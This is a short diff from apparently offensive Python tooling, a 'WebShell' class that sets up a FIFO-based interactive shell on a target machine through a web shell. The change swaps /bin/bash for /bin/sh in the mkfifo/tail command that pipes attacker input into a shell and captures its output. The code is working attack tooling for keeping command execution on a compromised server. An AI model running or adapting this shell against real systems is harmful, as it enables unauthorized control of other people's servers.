@@ -23,7 +23,7 @@ class WebShell(object):
         self.interval = interval
         
         print("[*] Setting up fifo shell on target")
-        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/bash 2>&1 > {self.stdout}"
+        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
         self.RunRawCmd(MakeNamedPipes, timeout=0.1)
         
     def ReadThread(self):
